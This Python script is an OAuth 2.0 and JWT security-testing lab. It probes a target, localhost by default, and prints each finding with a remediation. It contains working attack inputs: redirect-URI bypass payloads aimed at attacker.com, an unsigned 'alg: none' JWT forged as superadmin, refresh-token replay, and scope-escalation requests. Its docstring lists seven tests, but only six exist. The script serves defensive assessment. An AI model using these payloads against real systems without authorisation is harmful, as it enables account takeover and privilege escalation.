#!/usr/bin/env python3
"""
Critical Lab 1: OAuth 2.0 Security Bypass and Token Manipulation
Industry-Grade API Penetration Testing Framework

This module systematically assesses and demonstrates critical OAuth 2.0 / OIDC flaws:
1. Missing State Parameter (OAuth CSRF / Account Takeover)
2. Open Redirect & Redirect URI Validation Flaws (Auth Code Interception)
3. Broken Token Endpoint Authentication (Unauthenticated Client Grants)
4. Refresh Token Reuse & Lack of Token Rotation
5. Implicit Flow Access Token Leakage (URL Fragment Exposure)
6. JWT Cryptographic Failures ('alg: none' header injection & claim manipulation)
7. Scope Escalation & Privilege Elevation
"""

import base64
import json
import time
from typing import Any, Dict, List, Optional
from urllib.parse import parse_qs, urlencode, urlparse

import requests


class Colors:
    HEADER = "\033[95m"
    BLUE = "\033[94m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    RESET = "\033[0m"
    BOLD = "\033[1m"


class OAuth2SecurityLab:
    """Automated security testing and verification harness for OAuth 2.0 endpoints."""

    def __init__(
        self,
        target_url: str,
        client_id: str,
        client_secret: str,
        auth_endpoint: str = "/oauth/authorize",
        token_endpoint: str = "/oauth/token",
        userinfo_endpoint: str = "/api/v1/userinfo",
    ):
        self.target_url = target_url.rstrip("/")
        self.client_id = client_id
        self.client_secret = client_secret
        self.auth_url = f"{self.target_url}{auth_endpoint}"
        self.token_url = f"{self.target_url}{token_endpoint}"
        self.userinfo_url = f"{self.target_url}{userinfo_endpoint}"

        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "SecOps-APITester/2.0"})
        self.findings: List[Dict[str, Any]] = []

    def log_result(
        self,
        test_name: str,
        vulnerable: bool,
        severity: str,
        impact: str,
        evidence: str,
        remediation: str,
    ):
        status_tag = f"{Colors.RED}[CRITICAL VULNERABILITY]{Colors.RESET}" if vulnerable else f"{Colors.GREEN}[SECURE]{Colors.RESET}"
        print(f"\n{status_tag} {Colors.BOLD}{test_name}{Colors.RESET}")
        print(f"  ├─ Evidence: {evidence}")

        if vulnerable:
            print(f"  ├─ Severity: {Colors.RED}{severity}{Colors.RESET}")
            print(f"  ├─ Business Impact: {impact}")
            print(f"  └─ Remediation: {Colors.YELLOW}{remediation}{Colors.RESET}")
            self.findings.append(
                {
                    "test": test_name,
                    "severity": severity,
                    "evidence": evidence,
                    "impact": impact,
                    "remediation": remediation,
                }
            )
        else:
            print(f"  └─ Validation: Request properly rejected or enforced.")

    # ----------------------------------------------------------------------
    # Test 1: OAuth CSRF (State Parameter Validation)
    # ----------------------------------------------------------------------
    def test_missing_state_parameter(self):
        print(f"\n{Colors.BLUE}[*] Running Test 1: Missing State Parameter Validation...{Colors.RESET}")
        auth_req_url = f"{self.auth_url}?client_id={self.client_id}&response_type=code&redirect_uri={self.target_url}/callback"

        try:
            res = self.session.get(auth_req_url, allow_redirects=False, timeout=5)
            location = res.headers.get("Location", "")

            # If authorization code is issued without enforcing or echoing state
            if res.status_code in [301, 302, 303] and "code=" in location and "state=" not in location:
                self.log_result(
                    test_name="OAuth 2.0 Missing State Parameter (CSRF)",
                    vulnerable=True,
                    severity="CRITICAL",
                    impact="Allows attackers to perform Login CSRF and link victim accounts to attacker-controlled OAuth credentials.",
                    evidence=f"302 Redirect issued code without state token: {location}",
                    remediation="Strictly require and cryptographically validate unique, unguessable state tokens tied to the user's session.",
                )
                return

        except requests.RequestException as e:
            print(f"  [!] Network error: {e}")

        self.log_result(
            test_name="OAuth 2.0 State Parameter Validation",
            vulnerable=False,
            severity="INFO",
            impact="None",
            evidence="Endpoint rejected request or enforced state parameter validation.",
            remediation="Maintain existing validation.",
        )

    # ----------------------------------------------------------------------
    # Test 2: Redirect URI Validation Bypass
    # ----------------------------------------------------------------------
    def test_redirect_uri_bypasses(self):
        print(f"\n{Colors.BLUE}[*] Running Test 2: Redirect URI Validation Bypass Techniques...{Colors.RESET}")

        bypass_payloads = [
            f"https://attacker.com",
            f"{self.target_url}.attacker.com/callback",
            f"{self.target_url}/callback@attacker.com",
            f"{self.target_url}/callback/../../attacker",
            f"{self.target_url}/callback?redirect=https://attacker.com",
            f"{self.target_url}%23@attacker.com",
        ]

        for payload in bypass_payloads:
            try:
                url = f"{self.auth_url}?client_id={self.client_id}&response_type=code&redirect_uri={payload}"
                res = self.session.get(url, allow_redirects=False, timeout=5)
                location = res.headers.get("Location", "")

                if res.status_code in [301, 302, 303] and ("code=" in location or "attacker.com" in location):
                    self.log_result(
                        test_name=f"Redirect URI Filter Bypass via: {payload}",
                        vulnerable=True,
                        severity="CRITICAL",
                        impact="Attacker can steal raw authorization codes and hijack user accounts.",
                        evidence=f"Redirected to: {location}",
                        remediation="Implement strict exact-string matching for redirect URIs. Avoid loose regexes or wildcard path matches.",
                    )
                    return

            except requests.RequestException:
                continue

        self.log_result(
            test_name="Redirect URI Validation",
            vulnerable=False,
            severity="INFO",
            impact="None",
            evidence="Target enforces strict URI allowlisting.",
            remediation="Maintain exact matching policies.",
        )

    # ----------------------------------------------------------------------
    # Test 3: Token Endpoint Authentication Bypass
    # ----------------------------------------------------------------------
    def test_token_endpoint_client_auth(self):
        print(f"\n{Colors.BLUE}[*] Running Test 3: Token Endpoint Client Authentication Bypass...{Colors.RESET}")

        payload = {
            "grant_type": "authorization_code",
            "code": "sample_auth_code",
            "redirect_uri": f"{self.target_url}/callback",
            "client_id": self.client_id,
        }

        try:
            res = self.session.post(self.token_url, data=payload, timeout=5)
            data = res.json() if res.headers.get("Content-Type", "").startswith("application/json") else {}

            if res.status_code == 200 and "access_token" in data:
                self.log_result(
                    test_name="Token Endpoint Missing Client Authentication",
                    vulnerable=True,
                    severity="CRITICAL",
                    impact="Confidential client credentials are not validated, enabling arbitrary token exchange by unauthorized parties.",
                    evidence=f"Token issued without client_secret: {res.text}",
                    remediation="Require client_secret via HTTP Basic Auth or secure body param, or enforce PKCE (RFC 7636) for public clients.",
                )
                return

        except requests.RequestException as e:
            print(f"  [!] Request error: {e}")

        self.log_result(
            test_name="Token Endpoint Client Authentication",
            vulnerable=False,
            severity="INFO",
            impact="None",
            evidence="Token endpoint rejected requests lacking valid client secrets.",
            remediation="Continue enforcing confidential client verification.",
        )

    # ----------------------------------------------------------------------
    # Test 4: Refresh Token Abuse & Lifetime Flaws
    # ----------------------------------------------------------------------
    def test_refresh_token_rotation(self, initial_refresh_token: str = "test_refresh_token_123"):
        print(f"\n{Colors.BLUE}[*] Running Test 4: Refresh Token Rotation & Reuse Abuse...{Colors.RESET}")

        payload = {
            "grant_type": "refresh_token",
            "refresh_token": initial_refresh_token,
            "client_id": self.client_id,
            "client_secret": self.client_secret,
        }

        success_count = 0
        try:
            for _ in range(3):
                res = self.session.post(self.token_url, data=payload, timeout=5)
                if res.status_code == 200 and "access_token" in res.text:
                    success_count += 1
                time.sleep(0.5)

            if success_count > 1:
                self.log_result(
                    test_name="Lack of Refresh Token Rotation (RTR)",
                    vulnerable=True,
                    severity="HIGH",
                    impact="Stolen refresh tokens can be used indefinitely to generate new access tokens without revoking previous tokens.",
                    evidence=f"The same refresh token successfully minted new access tokens {success_count} times.",
                    remediation="Implement single-use Refresh Token Rotation (RTR) and revoke token families upon detection of reuse.",
                )
                return

        except requests.RequestException as e:
            print(f"  [!] Error: {e}")

        self.log_result(
            test_name="Refresh Token Rotation Check",
            vulnerable=False,
            severity="INFO",
            impact="None",
            evidence="Single-use refresh token constraints are enforced.",
            remediation="Maintain RTR implementation.",
        )

    # ----------------------------------------------------------------------
    # Test 5: JWT 'alg: none' & Unsigned Token Forgery
    # ----------------------------------------------------------------------
    def test_jwt_signature_bypass(self):
        print(f"\n{Colors.BLUE}[*] Running Test 5: JWT 'alg: none' Signature Validation Bypass...{Colors.RESET}")

        # Construct an 'alg: none' forged token for an admin identity
        header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip("=")
        payload = (
            base64.urlsafe_b64encode(
                json.dumps(
                    {
                        "sub": "1337",
                        "user": "admin",
                        "role": "superadmin",
                        "scope": "admin",
                        "iat": int(time.time()),
                        "exp": int(time.time()) + 3600,
                    }
                ).encode()
            )
            .decode()
            .rstrip("=")
        )

        forged_jwt = f"{header}.{payload}."

        try:
            headers = {"Authorization": f"Bearer {forged_jwt}"}
            res = self.session.get(self.userinfo_url, headers=headers, timeout=5)

            if res.status_code == 200:
                self.log_result(
                    test_name="JWT Signature Validation Bypass (alg: none Accepted)",
                    vulnerable=True,
                    severity="CRITICAL",
                    impact="Complete authentication bypass. Attackers can forge arbitrary administrative tokens and impersonate any user.",
                    evidence=f"API accepted unsigned JWT. Response: {res.text}",
                    remediation="Explicitly whitelist allowed signing algorithms (e.g., RS256/ES256) and reject 'none' or mismatched algorithms.",
                )
                return

        except requests.RequestException as e:
            print(f"  [!] Error: {e}")

        self.log_result(
            test_name="JWT Signature Integrity Verification",
            vulnerable=False,
            severity="INFO",
            impact="None",
            evidence="Server rejected unsigned or forged JWT tokens.",
            remediation="Keep asymmetric signature verification strictly enforced.",
        )

    # ----------------------------------------------------------------------
    # Test 6: Scope Escalation
    # ----------------------------------------------------------------------
    def test_scope_escalation(self):
        print(f"\n{Colors.BLUE}[*] Running Test 6: Client Scope Escalation...{Colors.RESET}")

        escalation_payloads = ["admin", "root", "write:*", "system:all"]

        for scope in escalation_payloads:
            payload = {
                "grant_type": "client_credentials",
                "client_id": self.client_id,
                "client_secret": self.client_secret,
                "scope": scope,
            }

            try:
                res = self.session.post(self.token_url, data=payload, timeout=5)
                data = res.json() if res.headers.get("Content-Type", "").startswith("application/json") else {}

                if res.status_code == 200 and data.get("scope") == scope:
                    self.log_result(
                        test_name=f"Unauthorized Scope Escalation to '{scope}'",
                        vulnerable=True,
                        severity="CRITICAL",
                        impact="Low-privilege API clients can request administrative scopes without authorization checks.",
                        evidence=f"Granted elevated scope: {data.get('scope')}",
                        remediation="Enforce strict role-to-scope mappings on the authorization server. Validate requested scopes against client registry.",
                    )
                    return

            except requests.RequestException:
                continue

        self.log_result(
            test_name="Scope Authorization Control",
            vulnerable=False,
            severity="INFO",
            impact="None",
            evidence="Unauthorized scopes were stripped or rejected by the server.",
            remediation="Maintain client scope allowlists.",
        )

    # ----------------------------------------------------------------------
    # Harness Execution
    # ----------------------------------------------------------------------
    def run_all(self):
        print(f"{Colors.HEADER}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD} CRITICAL OAUTH 2.0 & JWT PENETRATION TESTING SUITE{Colors.RESET}")
        print(f" Target Host: {self.target_url}")
        print(f"{Colors.HEADER}{'='*70}{Colors.RESET}")

        self.test_missing_state_parameter()
        self.test_redirect_uri_bypasses()
        self.test_token_endpoint_client_auth()
        self.test_refresh_token_rotation()
        self.test_jwt_signature_bypass()
        self.test_scope_escalation()

        print(f"\n{Colors.HEADER}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}AUDIT SUMMARY{Colors.RESET}")
        print(f"Total Critical Vulnerabilities Discovered: {len(self.findings)}")
        print(f"{Colors.HEADER}{'='*70}{Colors.RESET}")


if __name__ == "__main__":
    TARGET_API = "http://localhost:8080"
    CLIENT_ID = "vulnerable_client_id"
    CLIENT_SECRET = "vulnerable_client_secret"

    tester = OAuth2SecurityLab(
        target_url=TARGET_API,
        client_id=CLIENT_ID,
        client_secret=CLIENT_SECRET,
    )
    tester.run_all()
